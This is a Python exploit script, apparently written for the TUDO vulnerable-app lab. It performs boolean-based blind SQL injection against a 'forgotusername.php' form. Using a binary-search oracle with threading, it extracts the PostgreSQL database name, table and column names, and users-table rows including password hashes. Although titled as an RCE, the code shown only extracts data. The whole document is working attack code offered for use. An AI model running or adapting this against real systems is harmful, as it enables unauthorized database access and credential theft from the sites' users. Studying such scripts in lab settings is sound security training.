#!/usr/bin/env python3

# @title  TUDO Unauthenticated RCE
# @author brave_


import requests
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

class CleanSQLiExploiter:
    def __init__(self, target_ip):
        self.url = f"http://{target_ip}/forgotusername.php"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
    
    def check_oracle(self, payload):
        """Check if the SQL condition is true based on application response"""
        data = {'username': payload}
        try:
            response = self.session.post(self.url, data=data, timeout=5)
            return "User exists!" in response.text
        except Exception as e:
            return False
    
    def binary_search_char(self, query, position):
        """Use binary search to find character at position"""
        low = 32   # ASCII printable start
        high = 126 # ASCII printable end
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if ASCII value >= mid
            payload = f"admin' AND ASCII(SUBSTRING(({query}),{position},1))>={mid} AND 'x'='x"
            if self.check_oracle(payload):
                # Character is >= mid, test if it's exactly mid
                payload_exact = f"admin' AND ASCII(SUBSTRING(({query}),{position},1))={mid} AND 'x'='x"
                if self.check_oracle(payload_exact):
                    return chr(mid)
                else:
                    # Character is > mid, search upper half
                    low = mid + 1
            else:
                # Character is < mid, search lower half
                high = mid - 1
        
        return None
    
    def extract_with_binary_search(self, query):
        """Extract data using binary search algorithm without progress output"""
        result = ""
        position = 1
        
        while position <= 100:  # Safety limit
            char = self.binary_search_char(query, position)
            
            if char:
                result += char
                position += 1
            else:
                break  # End of data
        
        return result
    
    def extract_position_threaded(self, args):
        """Extract a single position using binary search (thread-safe)"""
        query, position = args
        return (position, self.binary_search_char(query, position))
    
    def extract_with_binary_search_threaded(self, query, max_threads=5):
        """Extract multiple positions in parallel using binary search without output"""
        result = {}
        max_length = 100
        
        # Find the length silently
        length = 0
        for i in range(1, max_length):
            payload = f"admin' AND LENGTH(({query}))={i} AND 'x'='x"
            if self.check_oracle(payload):
                length = i
                break
        
        if length == 0:
            return ""
        
        # Extract all positions in parallel
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            positions = list(range(1, length + 1))
            future_to_pos = {
                executor.submit(self.extract_position_threaded, (query, pos)): pos 
                for pos in positions
            }
            
            for future in as_completed(future_to_pos):
                pos = future_to_pos[future]
                try:
                    char_result = future.result()
                    if char_result[1]:
                        result[char_result[0]] = char_result[1]
                except:
                    pass
        
        # Reconstruct the string
        final_result = ""
        for i in range(1, length + 1):
            if i in result:
                final_result += result[i]
        
        return final_result

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 sqli_clean.py <target_ip>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    exploiter = CleanSQLiExploiter(target_ip)
    
    print("=" * 50)
    print(f"[*] Targeting: {target_ip}")
    print("[*] TUDO ---- PostgreSQL SQL Injection Exploit")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        # Get database name
        print("[+] Getting current database...")
        db_name = exploiter.extract_with_binary_search("SELECT current_database()")
        print(f"[+] Current database: {db_name}")
        
        # Get tables
        print("[+] Extracting tables...")
        tables_query = "SELECT string_agg(table_name, ', ') FROM information_schema.tables WHERE table_schema='public'"
        tables_result = exploiter.extract_with_binary_search_threaded(tables_query)
        tables = [t.strip() for t in tables_result.split(',')]
        print(f"[+] Tables found: {tables}")
        
        # Extract users table
        print("\n[*] Extracting from users table...")
        print("[+] Extracting columns from users...")
        columns_query = "SELECT string_agg(column_name, ', ') FROM information_schema.columns WHERE table_name='users' AND table_schema='public'"
        columns_result = exploiter.extract_with_binary_search_threaded(columns_query)
        columns = [c.strip() for c in columns_result.split(',')]
        print(f"[+] Columns in users table: {columns}")
        
        print("[+] Dumping data from users...")
        
        # Extract user data silently
        users_data = []
        for user_id in range(1, 4):
            user_data = {'uid': str(user_id)}
            for column in columns:
                if column != 'uid':
                    query = f"SELECT {column} FROM public.users WHERE uid = {user_id}"
                    value = exploiter.extract_with_binary_search_threaded(query)
                    if value:
                        user_data[column] = value
            users_data.append(user_data)
        
        # Display final results
        print("\n" + "=" * 60)
        print("[+] FINAL DUMP - Users Table")
        print("=" * 60)
        
        for i, user_data in enumerate(users_data):
            print(f"User {i+1}:")
            for col in columns:
                if col in user_data:
                    print(f"  {col}: {user_data[col]}")
            print("-" * 30)
        
        # Extract and display password hashes specifically
        print("\n" + "=" * 60)
        print("[+] PASSWORD HASHES EXTRACTED")
        print("=" * 60)
        
        for i, user_data in enumerate(users_data):
            if 'username' in user_data and 'password' in user_data:
                print(f"{user_data['username']}: {user_data['password']}")
        
        end_time = time.time()
        print(f"\n[+] Extraction completed in {end_time - start_time:.2f} seconds")
        
    except KeyboardInterrupt:
        print("\n[!] Exploitation interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during exploitation: {e}")

if __name__ == "__main__":
    main()
